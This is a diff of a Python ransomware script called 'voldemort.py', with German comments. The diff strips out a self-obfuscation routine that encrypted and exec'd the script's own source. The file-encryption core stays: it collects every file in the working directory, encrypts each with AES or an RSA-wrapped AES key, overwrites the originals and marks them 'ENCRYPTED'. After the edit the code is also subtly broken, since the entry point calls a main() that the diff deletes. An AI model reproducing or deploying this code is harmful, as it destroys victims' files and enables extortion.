@@ -1,52 +1,21 @@
 #!/usr/bin/env python3
+
 import os
-import base64
-import zlib
-import random
-import string
-from pathlib import Path
-from cryptography.fernet import Fernet
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives.asymmetric import rsa, padding
-from cryptography.hazmat.primitives import serialization, hashes
+from pathlib  import Path
+from cryptography.fernet import Fernet # type: ignore
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes # type: ignore
+from cryptography.hazmat.backends import default_backend # type: ignore
+from cryptography.hazmat.primitives.asymmetric import rsa, padding # type: ignore
+from cryptography.hazmat.primitives import serialization, hashes  # type: ignore
 
-class CodeObfuscator:
-    def __init__(self):
-        self.key = Fernet.generate_key()
-        self.cipher = Fernet(self.key)
-        
-    def generate_random_name(self, length=10):
-        """Generiert zufällige Variablennamen"""
-        return ''.join(random.choices(string.ascii_letters, k=length))
-    
-    def obfuscate(self, code: str) -> str:
-        """Verschleiert den Code"""
-        # Code komprimieren und verschlüsseln
-        compressed = zlib.compress(code.encode())
-        encrypted = self.cipher.encrypt(base64.b85encode(compressed))
-        
-        # Zufällige Variablennamen
-        var1 = self.generate_random_name()
-        var2 = self.generate_random_name()
-        var3 = self.generate_random_name()
-        
-        # Verschleierter Code
-        obfuscated = f"""
-import base64,zlib,os
-from cryptography.fernet import Fernet
-{var1}={self.key}
-{var2}=Fernet({var1})
-{var3}=exec(zlib.decompress(base64.b85decode({var2}.decrypt({encrypted}))))
-"""
-        return obfuscated
-
-# Der Rest deines originalen Codes hier
+# Marker zur Kennzeichnung verschlüsselter Dateien
 MARKER = "ENCRYPTED"
 
+# AES Schlüssle generieren
 def generate_aes_key():
     return os.urandom(32)
 
+# AES verschlüsseln
 def aes_encrypt(key, data):
     iv = os.urandom(16)
     cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
@@ -54,14 +23,16 @@ def aes_encrypt(key, data):
     encrypted_data = iv + encryptor.update(data) + encryptor.finalize()
     return encrypted_data
 
+# RSA Schlüssel generieren
 def generate_rsa_key():
-    private_key = rsa.generate_private_key(
+    private_key = rsa .generate_private_key(
         public_exponent=65537,
         key_size=2048,
         backend=default_backend()
     )
     return private_key
 
+# RSA verschlüsseln
 def rsa_encrypt(public_key, data):
     encrypted_data = public_key.encrypt(
         data,
@@ -77,7 +48,7 @@ def checkIf():
     # Dateien finden
     files = []
     for file in os.listdir():
-        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py"or file == "aes_key.enc"  or file == "un_voldemort.py":
+        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py"or file == "aes_key.enc"  or file.startswith('.'):
             continue
         if os.path.isfile(file):
             files.append(file)
@@ -94,28 +65,28 @@ def checkIf():
             return False
     
     return True
+    
 
-def encrypt_files():
-    print("\n=== Voldemort Ransomware ===")
-    print("Wähle Verschlüsselungsalgorithmus:")
+# Auswahl ob es mit AES oder RSA verschüsslet werden soll
+def auswahl():
+    print("Wählen den Verschlüsselungsalgorithmus:")
     print("1. AES")
     print("2. RSA")
-    choice = input("Wahl (1 oder 2): ")
+    choice = input("Deine Wahl (1 oder 2): ")
 
-    if choice == "1":
+    if choice == "1" and checkIf():
         aes_key = generate_aes_key()
         with open("thekey.key", "wb") as key_file:
             key_file.write(aes_key)
         encrypt_func = lambda data: aes_encrypt(aes_key, data)
-        print("AES Modus aktiviert")
-
-    elif choice == "2":
+        print("AES Schlüssel generiert.")
+    elif choice == "2" and checkIf():
         aes_key = generate_aes_key()
         rsa_key = generate_rsa_key()
         with open("thekey.key", "wb") as key_file:
             key_file.write(rsa_key.private_bytes(
                 encoding=serialization.Encoding.PEM,
-                format=serialization.PrivateFormat.PKCS8,
+                format=serialization.PrivateFormat.TraditionalOpenSSL,
                 encryption_algorithm=serialization.NoEncryption()
             ))
         public_key = rsa_key.public_key()
@@ -123,45 +94,38 @@ def encrypt_files():
         with open("aes_key.enc", "wb") as key_file:
             key_file.write(encrypted_aes_key)
         encrypt_func = lambda data: aes_encrypt(aes_key, data)
-        print("RSA/AES Hybrid Modus aktiviert")
+        print("RSA Schlüssel generiert.")
     else:
         print("Ungültige Wahl!")
         return
 
-  # Dateien verschlüsseln 
-    files = [file for file in os.listdir() if os.path.isfile(file) and file not in ("voldemort.py", "thekey.key", "decrypt.py", "aes_key.enc", "un_voldemort.py") and not file.startswith('.')] 
-    print("Files to encrypt:", files) 
 
-    for file in files:  
-        file_path = Path(file) 
-        with file_path.open("rb") as thefile: 
-            contents = thefile.read() 
-        if MARKER.encode() in contents: 
-            print(f"{file} ist bereits verschlüsselt.") 
-            continue 
-        encrypted_data = encrypt_func(contents) + MARKER.encode() 
-        with file_path.open("wb") as thefile: 
-            thefile.write(encrypted_data) 
+
+# Dateien finden
+    files = []
+    for file in os.listdir():
+        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py"or file == "aes_key.enc"  or file.startswith('.'):
+            continue
+        if os.path.isfile(file):
+            files.append(file)
+    print("Files to encrypt:", files)
+
+# Dateien verschlüsseln
+    for file in files:
+        file_path = Path(file)
+        with file_path.open("rb") as thefile:
+            contents = thefile.read()
+
+# Bereits verschlüsselte Dateien überspringen
+        if MARKER.encode() in contents:
+            print(f"{file} ist bereits verschlüsselt.")
+            continue
+
+        encrypted_data = encrypt_func(contents) + MARKER.encode()
+        with file_path.open("wb") as thefile:
+            thefile.write(encrypted_data)
 
     print("Files successfully encrypted.")
 
-def main():
-    encrypt_files()
-
-if __name__ == "__main__":
-    # Code selbst verschleiern
-    with open(__file__, 'r') as f:
-        content = f.read()
-    
-    if 'CodeObfuscator' in content:
-        # Noch nicht verschleiert
-        obfuscator = CodeObfuscator()
-        obfuscated_code = obfuscator.obfuscate(content)
-        
-        with open(__file__, 'w') as f:
-            f.write(obfuscated_code)
-        
-        print("Code verschleiert. Starte neu für Dateiverschlüsselung.")
-    else:
-        # Bereits verschleiert, normale Ausführung
-        main()
+if  __name__ == "__main__":
+    main()
